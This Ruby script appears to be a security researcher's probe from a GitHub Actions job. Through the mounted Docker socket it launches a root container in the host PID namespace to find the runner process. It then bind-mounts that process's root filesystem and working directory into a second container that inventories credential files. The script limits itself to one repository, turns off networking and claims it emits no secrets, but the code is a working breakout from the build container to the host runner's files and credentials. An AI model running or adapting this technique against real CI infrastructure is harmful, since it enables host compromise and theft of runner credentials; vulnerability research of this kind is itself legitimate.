# frozen_string_literal: true

require "json"
require "securerandom"
require "socket"

SOURCE_REPOSITORY = "singetu0096/pages-post-url-regexp-canary-20260915"
CHILD_FILENAME = "31-host-inventory-child.rb"

def docker_request(method, request_path, request_body = "")
  socket = UNIXSocket.new("/var/run/docker.sock")
  crlf = 13.chr + 10.chr
  socket.write([
    method + " " + request_path + " HTTP/1.0",
    "Host: localhost",
    "Connection: close",
    "Content-Type: application/json",
    "Content-Length: " + request_body.bytesize.to_s,
    "",
    request_body
  ].join(crlf))
  raw = socket.read
  status = raw.lines.first.to_s.split[1].to_i
  body = raw.partition(crlf + crlf)[2]
  [status, body]
rescue StandardError
  [0, ""]
ensure
  socket.close if defined?(socket) && socket
end

def docker_get(request_path)
  docker_request("GET", request_path)
end

def docker_counts
  status, body = docker_get("/info")
  counts = {}
  if status == 200
    parsed = JSON.parse(body)
    %w[Containers ContainersRunning ContainersPaused ContainersStopped].each do |key|
      counts[key] = Integer(parsed[key]) if parsed.key?(key)
    end
  end
  [status, counts]
rescue StandardError
  [status || 0, {"parse_error" => true}]
ensure
  body = nil
  parsed = nil
end

def confined_host_config(binds, pid_mode)
  {
    "AutoRemove" => false,
    "Binds" => binds,
    "CapAdd" => [],
    "CapDrop" => ["ALL"],
    "Devices" => [],
    "DeviceRequests" => [],
    "IpcMode" => "private",
    "LogConfig" => {
      "Type" => "json-file",
      "Config" => {"max-size" => "64k", "max-file" => "1"}
    },
    "Memory" => 134_217_728,
    "MemorySwap" => 134_217_728,
    "NanoCpus" => 100_000_000,
    "NetworkMode" => "none",
    "PidMode" => pid_mode,
    "PidsLimit" => 32,
    "PortBindings" => {},
    "Privileged" => false,
    "PublishAllPorts" => false,
    "ReadonlyRootfs" => true,
    "RestartPolicy" => {"Name" => "no", "MaximumRetryCount" => 0},
    "SecurityOpt" => ["no-new-privileges"]
  }
end

def run_confined_container(image_id:, child_source:, name:, user:, env:, binds:, pid_mode:)
  run = {
    "configured" => true,
    "create_status" => 0,
    "start_request_sent" => false,
    "bind_count" => binds.length,
    "raw_bind_sources_emitted" => false
  }
  container_id = nil
  child_result = nil
  body = JSON.generate(
    "Image" => image_id,
    "Entrypoint" => ["/usr/local/bin/ruby", "-W0", "-e", child_source],
    "Cmd" => [],
    "User" => user,
    "WorkingDir" => "/",
    "Env" => env,
    "NetworkDisabled" => true,
    "AttachStdin" => false,
    "AttachStdout" => true,
    "AttachStderr" => true,
    "OpenStdin" => false,
    "StdinOnce" => false,
    "Tty" => true,
    "Labels" => {
      "com.github.security-research.owned-canary" => "true",
      "com.github.security-research.runner-credential" => "offline-classification-only"
    },
    "StopTimeout" => 2,
    "HostConfig" => confined_host_config(binds, pid_mode)
  )

  create_status, create_response = docker_request(
    "POST",
    "/containers/create?name=" + name,
    body
  )
  run["create_status"] = create_status
  if create_status == 201
    candidate_id = JSON.parse(create_response).fetch("Id", "").to_s
    container_id = candidate_id if candidate_id.match?(/\A[0-9a-f]{64}\z/)
  end
  unless container_id
    run["created"] = false
    return [run, nil, nil]
  end
  run["created"] = true

  inspect_status, inspect_response = docker_get("/containers/" + container_id + "/json")
  run["prestart_inspect_status"] = inspect_status
  if inspect_status == 200
    inspect_json = JSON.parse(inspect_response)
    config = inspect_json.fetch("Config", {})
    host_config = inspect_json.fetch("HostConfig", {})
    accepted = {
      "binds_exact" => Array(host_config["Binds"]).sort == binds.sort,
      "network_none" => host_config["NetworkMode"].to_s == "none",
      "network_disabled" => !!config["NetworkDisabled"],
      "privileged_false" => !host_config["Privileged"],
      "user_exact" => config["User"].to_s == user,
      "pid_mode_exact" => host_config["PidMode"].to_s == pid_mode,
      "ipc_mode_not_host" => host_config["IpcMode"].to_s != "host",
      "uts_mode_not_host" => host_config["UTSMode"].to_s != "host",
      "readonly_rootfs" => !!host_config["ReadonlyRootfs"],
      "cap_add_empty" => Array(host_config["CapAdd"]).empty?,
      "cap_drop_all" => Array(host_config["CapDrop"]).any? { |entry| entry.to_s.casecmp?("all") },
      "no_new_privileges" => Array(host_config["SecurityOpt"]).any? { |entry| entry.to_s.include?("no-new-privileges") },
      "device_count_zero" => Array(host_config["Devices"]).empty?,
      "device_request_count_zero" => Array(host_config["DeviceRequests"]).empty?,
      "memory_limit_exact" => host_config["Memory"].to_i == 134_217_728,
      "pids_limit_exact" => host_config["PidsLimit"].to_i == 32,
      "restart_policy_none" => host_config.dig("RestartPolicy", "Name").to_s == "no"
    }
    run["constraints_accepted"] = accepted
  end

  accepted = run.fetch("constraints_accepted", {})
  unless inspect_status == 200 && accepted.length == 17 && accepted.values.all?
    run["start_refused_due_to_constraint_mismatch"] = true
    return [run, nil, container_id]
  end

  start_status, = docker_request("POST", "/containers/" + container_id + "/start")
  run["start_request_sent"] = true
  run["start_status"] = start_status
  return [run, nil, container_id] unless start_status == 204

  120.times do
    state_status, state_response = docker_get("/containers/" + container_id + "/json")
    break unless state_status == 200

    state_json = JSON.parse(state_response)
    state = state_json.fetch("State", {})
    unless state["Running"]
      run["exit_code_zero"] = state.fetch("ExitCode", -1).to_i == 0
      break
    end
    sleep 0.05
  rescue StandardError
    break
  end

  logs_status, logs_body = docker_get(
    "/containers/" + container_id + "/logs?stdout=1&stderr=1&timestamps=0"
  )
  run["logs_status"] = logs_status
  if logs_status == 200 && logs_body.bytesize <= 65_536
    first = logs_body.index("{")
    last = logs_body.rindex("}")
    if first && last && last >= first
      parsed_child = JSON.parse(logs_body.byteslice(first, last - first + 1))
      child_result = parsed_child if parsed_child.is_a?(Hash)
    end
  end
  run["child_json_valid"] = child_result.is_a?(Hash)
  [run, child_result, container_id]
rescue StandardError
  run["probe_error"] = true
  [run, nil, container_id]
ensure
  body = nil
  create_response = nil
  inspect_response = nil
  inspect_json = nil
  config = nil
  host_config = nil
  accepted = nil
  state_response = nil
  state_json = nil
  state = nil
  logs_body = nil
  parsed_child = nil
end

def delete_probe_container(container_id)
  return 0 unless container_id.to_s.match?(/\A[0-9a-f]{64}\z/)

  status, = docker_request(
    "DELETE",
    "/containers/" + container_id + "?force=1&v=1"
  )
  status
end

result = {
  "probe" => "runner-listener-daemon-mediated-readonly-boundary-v1",
  "authorized_context" => {
    "github_actions" => ENV.fetch("GITHUB_ACTIONS", "") == "true",
    "source_repository" => ENV.fetch("GITHUB_REPOSITORY", "") == SOURCE_REPOSITORY
  },
  "safety_design" => {
    "researcher_owned_repository_only" => true,
    "planned_container_create_requests" => 2,
    "maximum_container_start_requests" => 2,
    "maximum_container_delete_requests" => 2,
    "locator_reads_only_proc_comm_and_status" => true,
    "locator_raw_pid_retained_in_final_artifact" => false,
    "runner_root_and_cwd_bind_read_only" => true,
    "classifier_user_matches_observed_runner_uid_1001" => true,
    "container_network_mode_none" => true,
    "container_network_disabled" => true,
    "privileged" => false,
    "host_pid_namespace_requests" => 1,
    "device_requests" => 0,
    "capabilities_dropped_all" => true,
    "no_new_privileges" => true,
    "host_file_writes_by_payload" => 0,
    "allowlisted_sensitive_file_classes" => 5,
    "credential_values_read_for_local_classification" => "bounded-current-runner-only",
    "credential_values_used_in_requests" => 0,
    "credential_values_retained" => false,
    "host_process_environment_reads" => 0,
    "host_process_command_line_reads" => 0,
    "host_process_memory_reads" => 0,
    "network_requests_from_probe_containers" => 0,
    "internal_peer_requests" => 0,
    "cloud_api_requests" => 0,
    "hypervisor_device_writes" => 0,
    "credential_values_emitted" => false,
    "raw_paths_pids_or_addresses_emitted" => false
  }
}

unless result.dig("authorized_context", "github_actions") &&
       result.dig("authorized_context", "source_repository")
  result["refused_outside_exact_context"] = true
  puts JSON.generate(result)
  exit
end

workspace = ENV.fetch("GITHUB_WORKSPACE", "")
child_path = File.join(workspace, CHILD_FILENAME)
unless !workspace.empty? && File.file?(child_path)
  result["child_source_missing"] = true
  puts JSON.generate(result)
  exit
end

child_source = File.binread(child_path)
unless child_source.bytesize.between?(1, 32_768)
  result["child_source_size_refused"] = true
  puts JSON.generate(result)
  exit
end

self_name = Socket.gethostname
self_status, self_body = docker_get("/containers/" + self_name + "/json")
self_image_id = nil
self_id_match = false
if self_status == 200
  begin
    self_json = JSON.parse(self_body)
    self_id = self_json.fetch("Id", "").to_s
    self_id_match = self_name.length >= 12 && self_id.start_with?(self_name)
    self_image_id = self_json.fetch("Image", "").to_s if self_id_match
  rescue StandardError
    self_id_match = false
  end
end
self_body = nil
self_json = nil
self_id = nil

result["self_inspect_status"] = self_status
result["self_id_match"] = self_id_match
baseline_status, baseline_counts = docker_counts
result["baseline_info_status"] = baseline_status

locator_id = nil
classifier_id = nil
listener_pid = nil
begin
  if self_image_id.to_s.match?(/\Asha256:[0-9a-f]{64}\z/)
    locator_name = "pages-rce-runner-locator-" + SecureRandom.hex(8)
    locator_run, locator_child, locator_id = run_confined_container(
      image_id: self_image_id,
      child_source: child_source,
      name: locator_name,
      user: "0:0",
      env: ["MODE=locate"],
      binds: [],
      pid_mode: "host"
    )
    locator_run["exact_uid_1001_listener_count"] =
      locator_child&.fetch("exact_uid_1001_listener_count", nil)
    locator_valid = locator_child.is_a?(Hash) &&
      locator_child["probe"] == "runner-listener-locator-internal-v1" &&
      locator_child["exact_uid_1001_listener_count"] == 1 &&
      locator_child["pid"].to_s.match?(/\A[1-9][0-9]{0,9}\z/)
    listener_pid = locator_child["pid"].to_s if locator_valid
    locator_child.delete("pid") if locator_child.is_a?(Hash)
    locator_run["validated_unique_target"] = !!locator_valid
    locator_run["raw_pid_retained_in_final_artifact"] = false
    result["locator_run"] = locator_run

    locator_run["delete_status"] = delete_probe_container(locator_id)
    locator_id = nil

    if locator_valid
      runner_root_bind = "/proc/" + listener_pid + "/root:/owned-runner-root:ro"
      runner_cwd_bind = "/proc/" + listener_pid + "/cwd:/owned-runner-cwd:ro"
      classifier_name = "pages-rce-runner-classifier-" + SecureRandom.hex(8)
      classifier_run, classifier_child, classifier_id = run_confined_container(
        image_id: self_image_id,
        child_source: child_source,
        name: classifier_name,
        user: "1001:1001",
        env: [
          "MODE=classify",
          "RUNNER_ROOT=/owned-runner-root",
          "RUNNER_CWD=/owned-runner-cwd"
        ],
        binds: [runner_root_bind, runner_cwd_bind],
        pid_mode: ""
      )
      classifier_valid = classifier_child.is_a?(Hash) &&
        classifier_child["probe"] == "runner-listener-credential-offline-classification-v1"
      classifier_run["inventory_validated"] = !!classifier_valid
      classifier_run["inventory"] = classifier_child if classifier_valid
      result["classifier_run"] = classifier_run
    else
      result["classifier_refused_without_unique_target"] = true
    end
  else
    result["image_id_unavailable"] = true
  end
ensure
  classifier_delete_status = delete_probe_container(classifier_id)
  locator_delete_status = delete_probe_container(locator_id)
  result["classifier_run"]["delete_status"] = classifier_delete_status if result["classifier_run"]
  if result["locator_run"] && !result["locator_run"].key?("delete_status")
    result["locator_run"]["delete_status"] = locator_delete_status
  end
  listener_pid = nil
  locator_child = nil
  classifier_child = nil
  runner_root_bind = nil
  runner_cwd_bind = nil
  locator_id = nil
  classifier_id = nil
end

post_cleanup_status, post_cleanup_counts = docker_counts
result["post_cleanup_info_status"] = post_cleanup_status
result["counts_returned_to_baseline"] = baseline_counts == post_cleanup_counts

child_source = nil
child_path = nil
self_image_id = nil
baseline_counts = nil
post_cleanup_counts = nil

puts JSON.generate(result)
